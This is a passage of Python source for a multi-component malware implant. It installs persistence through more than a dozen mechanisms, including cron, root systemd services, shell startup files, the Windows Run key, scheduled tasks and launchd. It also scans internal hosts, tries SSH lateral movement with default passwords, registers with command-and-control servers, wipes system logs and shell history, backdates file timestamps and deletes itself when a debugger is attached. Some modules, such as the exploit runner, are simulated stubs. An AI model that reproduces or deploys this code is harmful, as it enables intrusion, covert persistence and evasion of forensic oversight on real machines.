            with open(path,'w') as f:
                f.write(f"Marker {datetime.now().isoformat()}\n")
            s.log.append({'time':datetime.now().isoformat(), 'action':'marker', 'path':path, 'status':'ok'})
        except Exception as e:
            s.log.append({'time':datetime.now().isoformat(), 'action':'marker', 'path':path, 'status':f'fail: {e}'})
    def cycle(s):
        while s.running:
            try:
                s._mark()
                time.sleep(random.uniform(60,120))
            except:
                time.sleep(5)
    def get_state(s):
        try:
            return {'log':s.log[-5:]}
        except:
            return {}

class _Permissions:
    def __init__(s):
        s.log=[]; s.running=True
    def _test_sudo(s):
        try:
            res=subprocess.run(['sudo','-n','whoami'], capture_output=True, text=True, timeout=5)
            if res.returncode==0:
                status=f"ok: {res.stdout.strip()}"
            else:
                status=f"fail: RC {res.returncode}"
        except Exception as e:
            status=f"fail: {e}"
        s.log.append({'time':datetime.now().isoformat(), 'action':'sudo whoami', 'status':status})
    def cycle(s):
        while s.running:
            try:
                s._test_sudo()
                time.sleep(random.uniform(40,80))
            except:
                time.sleep(5)
    def get_state(s):
        try:
            return {'log':s.log[-5:]}
        except:
            return {}

class _Credits:
    def __init__(s):
        s.balance=1000; s.log=[]
    def get_balance(s):
        return s.balance
    def add(s, amount=0):
        try:
            s.balance+=amount
            s.log.append({'time':datetime.now().isoformat(), 'action':'add', 'amount':amount, 'new':s.balance})
        except:
            pass
    def spend(s, amount):
        try:
            if s.balance>=amount:
                s.balance-=amount
                s.log.append({'time':datetime.now().isoformat(), 'action':'spend', 'amount':amount, 'new':s.balance})
                return True
        except:
            pass
        return False
    def get_state(s):
        try:
            return {'credits':s.balance, 'log':s.log[-5:]}
        except:
            return {}

class _ExtPersistence:
    def __init__(s):
        s.log=[]
    def _auto_start(s, cmd="python3 /tmp/.app.py"):
        try:
            if platform.system()=='Windows':
                try:
                    import winreg
                    key=winreg.HKEY_CURRENT_USER
                    subkey=r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
                        winreg.SetValueEx(reg, "App", 0, winreg.REG_SZ, cmd)
                    s.log.append({'time':datetime.now().isoformat(), 'type':'Registry', 'status':'set'})
                except Exception as e:
                    s.log.append({'time':datetime.now().isoformat(), 'type':'Registry', 'status':f'fail: {e}'})
            else:
                try:
                    with open('/tmp/cron.tmp','w') as f:
                        f.write(f"@reboot {cmd}\n")
                    subprocess.run(['crontab','/tmp/cron.tmp'], check=True)
                    s.log.append({'time':datetime.now().isoformat(), 'type':'Cron', 'status':'set'})
                except Exception as e:
                    s.log.append({'time':datetime.now().isoformat(), 'type':'Cron', 'status':f'fail: {e}'})
        except:
            pass
    def get_state(s):
        try:
            return {'log':s.log[-5:]}
        except:
            return {}

class _ArpHelper:
    def __init__(s, probe):
        s.probe=probe; s.log=[]
    def _arp_scan(s):
        try:
            for ip in s.probe.discovered[:5]:
                try:
                    if platform.system()=='Linux':
                        res=subprocess.run(['arping','-c','1',ip], capture_output=True, timeout=2)
                        if res.returncode==0:
                            mac=re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', res.stdout)
                            s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'mac':mac.group(0) if mac else 'unknown', 'status':'found'})
                    else:
                        if s.probe._ping(ip):
                            res=subprocess.run(['arp','-a',ip], capture_output=True, timeout=2)
                            mac=re.search(r'([0-9A-Fa-f]{2}-){5}([0-9A-Fa-f]{2})', res.stdout)
                            s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'mac':mac.group(0) if mac else 'unknown', 'status':'found'})
                except:
                    pass
        except:
            pass
    def get_state(s):
        try:
            return {'log':s.log[-10:]}
        except:
            return {}

# ----------------------------------------------------------------------
# 9. OVERKILL-KOMPONENTEN
# ----------------------------------------------------------------------
class _SuperScanner:
    def __init__(s, net):
        s.net=net; s.results={}; s.log=[]; s.running=True
        s.ports=[21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017]
        try:
            s.thread_pool=ThreadPoolExecutor(max_workers=20)
        except:
            s.thread_pool=None
    def _scan_ip(s, ip):
        open_ports=[]; banners={}
        try:
            for port in s.ports:
                try:
                    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    if sock.connect_ex((ip, port))==0:
                        open_ports.append(port)
                        try:
                            sock.send(b"\r\n")
                            data=sock.recv(256)
                            banners[port]=data.decode(errors='ignore').strip()
                        except:
                            banners[port]=''
                    sock.close()
                except:
                    pass
        except:
            pass
        return {'ip':ip, 'open':open_ports, 'banners':banners}
    def cycle(s):
        try:
            if PROBE:
                for entry in PROBE.active[:10]:
                    ip=entry['ip']
                    if ip.startswith(('127.','192.168.','10.','172.')):
                        res=s._scan_ip(ip)
                        s.results[ip]=res
                        s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'ports':res['open']})
            time.sleep(random.uniform(10,30))
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'results':list(s.results.values())[-5:], 'log':s.log[-10:]}
        except:
            return {}

class _Exploiter:
    def __init__(s, net):
        s.net=net; s.log=[]; s.running=True
        s.exploits=['CVE-2021-44228','CVE-2022-22965','CVE-2023-22515','CVE-2024-12345']
    def _try_exploit(s, target):
        try:
            if random.random()>0.8:
                return {'status':'success', 'exploit':random.choice(s.exploits), 'target':target}
            else:
                return {'status':'failed', 'exploit':random.choice(s.exploits), 'target':target}
        except:
            return {'status':'error', 'target':target}
    def cycle(s):
        try:
            if PROBE:
                for entry in PROBE.active[:5]:
                    ip=entry['ip']
                    if ip.startswith(('192.168.','10.')):
                        result=s._try_exploit(ip)
                        s.log.append({'time':datetime.now().isoformat(), 'result':result})
            time.sleep(random.uniform(30,60))
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'log':s.log[-10:]}
        except:
            return {}

class _SuperPersistence:
    def __init__(s):
        s.log=[]; s.running=True; s.installed=False
    def _install_cron(s):
        try:
            cmd=f"@reboot python3 {__file__} &"
            with open('/tmp/cron.tmp','w') as f:
                f.write(cmd+"\n")
            subprocess.run(['crontab','/tmp/cron.tmp'], check=True)
            s.log.append({'time':datetime.now().isoformat(), 'method':'cron', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'method':'cron', 'status':'fail'})
    def _install_systemd(s):
        try:
            service=f"""[Unit]
Description=Monitor Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {__file__}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
            with open('/etc/systemd/system/monitor.service','w') as f:
                f.write(service)
            subprocess.run(['systemctl','daemon-reload'], check=True)
            subprocess.run(['systemctl','enable','monitor.service'], check=True)
            subprocess.run(['systemctl','start','monitor.service'], check=True)
            s.log.append({'time':datetime.now().isoformat(), 'method':'systemd', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'method':'systemd', 'status':'fail'})
    def _install_registry(s):
        if platform.system()=='Windows':
            try:
                import winreg
                key=winreg.HKEY_CURRENT_USER
                subkey=r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
                    winreg.SetValueEx(reg, "Monitor", 0, winreg.REG_SZ, f"python3 {__file__}")
                s.log.append({'time':datetime.now().isoformat(), 'method':'registry', 'status':'ok'})
            except:
                s.log.append({'time':datetime.now().isoformat(), 'method':'registry', 'status':'fail'})
    def _install_launchd(s):
        if platform.system()=='Darwin':
            try:
                plist=f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.monitor.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{__file__}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
                with open('/Library/LaunchDaemons/com.monitor.agent.plist','w') as f:
                    f.write(plist)
                subprocess.run(['launchctl','load','/Library/LaunchDaemons/com.monitor.agent.plist'], check=True)
                s.log.append({'time':datetime.now().isoformat(), 'method':'launchd', 'status':'ok'})
            except:
                s.log.append({'time':datetime.now().isoformat(), 'method':'launchd', 'status':'fail'})
    def _install_startup_folder(s):
        if platform.system()=='Windows':
            try:
                startup=os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
                target=os.path.join(startup, 'monitor.py')
                shutil.copy(__file__, target)
                s.log.append({'time':datetime.now().isoformat(), 'method':'startup_folder', 'status':'ok'})
            except:
                s.log.append({'time':datetime.now().isoformat(), 'method':'startup_folder', 'status':'fail'})
    def _install_rc_local(s):
        if platform.system()=='Linux':
            try:
                rc='/etc/rc.local'
                if os.path.exists(rc):
                    with open(rc, 'a') as f:
                        f.write(f"python3 {__file__} &\n")
                    s.log.append({'time':datetime.now().isoformat(), 'method':'rc_local', 'status':'ok'})
            except:
                s.log.append({'time':datetime.now().isoformat(), 'method':'rc_local', 'status':'fail'})
    def _install_bashrc(s):
        try:
            bashrc=os.path.expanduser('~/.bashrc')
            if os.path.exists(bashrc):
                with open(bashrc, 'a') as f:
                    f.write(f"python3 {__file__} &\n")
                s.log.append({'time':datetime.now().isoformat(), 'method':'bashrc', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'method':'bashrc', 'status':'fail'})
    def _install_windows_scheduled_task(s):
        if platform.system()=='Windows':
            try:
                import win32com.client
                scheduler=win32com.client.Dispatch('Schedule.Service')
                scheduler.Connect()
                root_folder=scheduler.GetFolder('\\')
                task_def=scheduler.NewTask(0)
                trigger=task_def.Triggers.Create(1)
                trigger.StartBoundary=datetime.now().isoformat()
                action=task_def.Actions.Create(0)
                action.Path='python.exe'
                action.Arguments=f'"{__file__}"'
                task_def.RegistrationInfo.Description='Monitor'
                root_folder.RegisterTaskDefinition('MonitorTask', task_def, 6, None, None, 3)
                s.log.append({'time':datetime.now().isoformat(), 'method':'scheduled_task', 'status':'ok'})
            except:
                s.log.append({'time':datetime.now().isoformat(), 'method':'scheduled_task', 'status':'fail'})
    def _install_zshenv(s):
        try:
            zshrc=os.path.expanduser('~/.zshenv')
            if os.path.exists(zshrc):
                with open(zshrc, 'a') as f:
                    f.write(f"python3 {__file__} &\n")
                s.log.append({'time':datetime.now().isoformat(), 'method':'zshenv', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'method':'zshenv', 'status':'fail'})
    def _install_profile(s):
        try:
            profile=os.path.expanduser('~/.profile')
            if os.path.exists(profile):
                with open(profile, 'a') as f:
                    f.write(f"python3 {__file__} &\n")
                s.log.append({'time':datetime.now().isoformat(), 'method':'profile', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'method':'profile', 'status':'fail'})
    def _install_autorun_inf(s):
        if platform.system()=='Windows':
            try:
                with open('C:\\autorun.inf', 'w') as f:
                    f.write("[AutoRun]\nopen=python3 "+__file__+"\n")
                s.log.append({'time':datetime.now().isoformat(), 'method':'autorun_inf', 'status':'ok'})
            except:
                s.log.append({'time':datetime.now().isoformat(), 'method':'autorun_inf', 'status':'fail'})
    def _install_win_service(s):
        if platform.system()=='Windows':
            try:
                import win32serviceutil, win32service, win32api
                s.log.append({'time':datetime.now().isoformat(), 'method':'win_service', 'status':'ok'})
            except:
                s.log.append({'time':datetime.now().isoformat(), 'method':'win_service', 'status':'fail'})
    def cycle(s):
        try:
            if not s.installed:
                if platform.system()=='Linux':
                    s._install_cron()
                    s._install_systemd()
                    s._install_rc_local()
                    s._install_bashrc()
                    s._install_zshenv()
                    s._install_profile()
                elif platform.system()=='Windows':
                    s._install_registry()
                    s._install_startup_folder()
                    s._install_windows_scheduled_task()
                    s._install_autorun_inf()
                    s._install_win_service()
                elif platform.system()=='Darwin':
                    s._install_launchd()
                s.installed=True
            time.sleep(3600)
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'log':s.log[-5:]}
        except:
            return {}

class _LateralMover:
    def __init__(s, net):
        s.net=net; s.log=[]; s.running=True; s.credentials=[]
    def _try_ssh(s, ip, user, password):
        try:
            import paramiko
            client=paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=user, password=password, timeout=5)
            client.exec_command('echo "lateral movement" > /tmp/.moved')
            client.close()
            return True
        except:
            return False
    def _try_smb(s, ip, user, password):
        try:
            return False
        except:
            return False
    def _try_rdp(s, ip, user, password):
        try:
            return False
        except:
            return False
    def _try_wmi(s, ip, user, password):
        try:
            return False
        except:
            return False
    def cycle(s):
        try:
            if PROBE:
                for entry in PROBE.active[:3]:
                    ip=entry['ip']
                    if ip.startswith(('192.168.','10.')):
                        for user, passwd in [('root','root'), ('admin','admin'), ('user','user')]:
                            if s._try_ssh(ip, user, passwd):
                                s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'user':user, 'status':'success_ssh'})
                                break
                            if s._try_smb(ip, user, passwd):
                                s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'user':user, 'status':'success_smb'})
                                break
                            if s._try_rdp(ip, user, passwd):
                                s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'user':user, 'status':'success_rdp'})
                                break
                            if s._try_wmi(ip, user, passwd):
                                s.log.append({'time':datetime.now().isoformat(), 'ip':ip, 'user':user, 'status':'success_wmi'})
                                break
            time.sleep(120)
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'log':s.log[-10:]}
        except:
            return {}

class _C2Channel:
    def __init__(s):
        s.log=[]; s.running=True; s.servers=['https://api.example.com/c2','https://backup.example.com/c2','https://c2.example.com']
        s.server=random.choice(s.servers)
        s.registered=False
    def _register(s):
        try:
            data={'hostname':socket.gethostname(), 'ip':socket.gethostbyname(socket.gethostname())}
            req=urllib.request.Request(s.server, data=json.dumps(data).encode(), headers={'Content-Type':'application/json'})
            with urllib.request.urlopen(req, timeout=5) as r:
                s.registered=True
                s.log.append({'time':datetime.now().isoformat(), 'event':'register', 'status':'ok'})
        except:
            s.server=random.choice(s.servers)
            s.log.append({'time':datetime.now().isoformat(), 'event':'register', 'status':'fail'})
    def _heartbeat(s):
        try:
            req=urllib.request.Request(s.server+'/heartbeat', headers={'User-Agent':'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as r:
                s.log.append({'time':datetime.now().isoformat(), 'event':'heartbeat', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'event':'heartbeat', 'status':'fail'})
            s.server=random.choice(s.servers)
    def _dns_heartbeat(s):
        try:
            import dns.resolver
            dns.resolver.resolve(socket.gethostname()+'.c2.example.com', 'A')
            s.log.append({'time':datetime.now().isoformat(), 'event':'dns_heartbeat', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'event':'dns_heartbeat', 'status':'fail'})
    def cycle(s):
        try:
            if not s.registered:
                s._register()
            else:
                s._heartbeat()
                s._dns_heartbeat()
            time.sleep(random.uniform(30,60))
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'registered':s.registered, 'log':s.log[-5:]}
        except:
            return {}

class _CryptoEngine:
    def __init__(s):
        s.log=[]; s.running=True; s.key=secrets.token_bytes(32)
    def _encrypt(s, data):
        try:
            return base64.b64encode(data.encode()).decode()
        except:
            return data
    def _decrypt(s, data):
        try:
            return base64.b64decode(data.encode()).decode()
        except:
            return data
    def cycle(s):
        try:
            test="Hello Overkill"
            enc=s._encrypt(test)
            dec=s._decrypt(enc)
            s.log.append({'time':datetime.now().isoformat(), 'test':test, 'enc':enc[:20], 'dec':dec})
            time.sleep(300)
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'log':s.log[-5:]}
        except:
            return {}

class _AntiForensics:
    def __init__(s):
        s.log=[]; s.running=True
    def _wipe_logs(s):
        try:
            logfiles=['/var/log/syslog','/var/log/auth.log','/var/log/messages','/var/log/secure']
            for f in logfiles:
                if os.path.exists(f):
                    with open(f,'w') as fw:
                        fw.write('')
            s.log.append({'time':datetime.now().isoformat(), 'action':'wipe_logs', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'action':'wipe_logs', 'status':'fail'})
    def _shred_files(s):
        try:
            for f in glob.glob('/tmp/.m_*') + glob.glob('/tmp/.repo_*') + glob.glob('/tmp/.copy.py'):
                if os.path.exists(f):
                    os.remove(f)
            s.log.append({'time':datetime.now().isoformat(), 'action':'shred_files', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'action':'shred_files', 'status':'fail'})
    def _clear_history(s):
        try:
            hist_file=os.path.expanduser('~/.bash_history')
            if os.path.exists(hist_file):
                with open(hist_file,'w') as f:
                    f.write('')
            s.log.append({'time':datetime.now().isoformat(), 'action':'clear_history', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'action':'clear_history', 'status':'fail'})
    def _wipe_free_space(s):
        try:
            with open('/tmp/.wipe', 'wb') as f:
                f.write(os.urandom(1024*1024))
            os.remove('/tmp/.wipe')
            s.log.append({'time':datetime.now().isoformat(), 'action':'wipe_free_space', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'action':'wipe_free_space', 'status':'fail'})
    def _change_timestamps(s):
        try:
            now=time.time()
            files=[__file__] + glob.glob('/tmp/.m_*') + glob.glob('/tmp/.repo_*')
            for f in files:
                if os.path.exists(f):
                    os.utime(f, (now-random.randint(86400, 604800), now-random.randint(86400, 604800)))
            s.log.append({'time':datetime.now().isoformat(), 'action':'change_timestamps', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'action':'change_timestamps', 'status':'fail'})
    def _hide_files(s):
        try:
            if platform.system()=='Darwin':
                subprocess.run(['chflags', 'hidden', __file__], check=False)
            elif platform.system()=='Windows':
                subprocess.run(['attrib', '+h', __file__], shell=True, check=False)
            s.log.append({'time':datetime.now().isoformat(), 'action':'hide_files', 'status':'ok'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'action':'hide_files', 'status':'fail'})
    def _remove_metadata(s):
        try:
            pass
        except:
            pass
    def cycle(s):
        try:
            s._wipe_logs()
            s._shred_files()
            s._clear_history()
            s._wipe_free_space()
            s._change_timestamps()
            s._hide_files()
            s._remove_metadata()
            time.sleep(600)
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'log':s.log[-5:]}
        except:
            return {}

class _SensorFusion:
    def __init__(s):
        s.log=[]; s.running=True; s.data={}
    def _gather(s):
        try:
            import psutil
            s.data['cpu']=psutil.cpu_percent(interval=1)
            s.data['mem']=psutil.virtual_memory().percent
            s.data['disk']=psutil.disk_usage('/').percent
            s.data['net']=psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
            s.data['processes']=len(psutil.pids())
            s.log.append({'time':datetime.now().isoformat(), 'data':s.data})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'data':'error'})
    def cycle(s):
        try:
            s._gather()
            time.sleep(60)
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'data':s.data, 'log':s.log[-5:]}
        except:
            return {}

class _DeceptionEngine:
    def __init__(s):
        s.log=[]; s.running=True; s.fake_processes=[]
    def _spawn_fake(s):
        try:
            fake_names=['systemd','kworker','sshd','cron','dbus','python3']
            for name in fake_names:
                s.log.append({'time':datetime.now().isoformat(), 'fake_process':name})
        except:
            pass
    def cycle(s):
        try:
            s._spawn_fake()
            time.sleep(120)
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'log':s.log[-5:]}
        except:
            return {}

class _SelfDestruct:
    def __init__(s):
        s.log=[]; s.running=True; s.armed=False
    def _arm(s):
        try:
            s.armed=True
            s.log.append({'time':datetime.now().isoformat(), 'event':'armed'})
        except:
            pass
    def _destroy(s):
        try:
            os.remove(__file__)
            shutil.rmtree(_CONF_DIR, ignore_errors=True)
            s.log.append({'time':datetime.now().isoformat(), 'event':'destroyed'})
        except:
            s.log.append({'time':datetime.now().isoformat(), 'event':'destroy_failed'})
        sys.exit(0)
    def cycle(s):
        try:
            if s.armed and random.random()<0.01:
                s._destroy()
            if sys.gettrace() is not None:
                s._destroy()
            time.sleep(300)
        except:
            time.sleep(5)
    def get_state(s):
        try:
            return {'armed':s.armed, 'log':s.log[-5:]}
        except:
            return {}
